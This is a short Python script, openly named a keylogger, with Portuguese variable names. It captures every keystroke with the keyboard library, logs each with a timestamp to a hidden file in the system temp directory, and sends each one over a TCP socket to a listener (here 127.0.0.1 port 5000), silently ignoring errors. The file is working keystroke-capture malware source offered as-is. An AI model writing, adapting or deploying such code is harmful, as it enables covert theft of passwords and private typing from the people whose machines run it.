import keyboard
import time
from datetime import datetime, timezone
import socket
import os
import tempfile

def keylogger():
    SERVER_URL = "http://127.0.0"

    caminho_temp = os.path.join(tempfile.gettempdir(), "dados.txt")

    logs = []

    def registerKey(tecla, horario):
        if keyboard.is_pressed(tecla):
            print(f'{horario}:{tecla}')
            logs.append(tecla)
            
            with open(caminho_temp, "a", encoding="utf-8") as arquivo:
                arquivo.write(f"{horario}:{tecla}\n")

            mensagem = f"Tecla: {tecla} | Horario: {horario}"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('127.0.0.1', 5000))
                s.sendall(mensagem.encode('utf-8'))
                s.close()
            except Exception:
                pass

    def main():
        while True:
            tecla = keyboard.read_key()
            horario = datetime.now()
            registerKey(tecla, horario)
    main()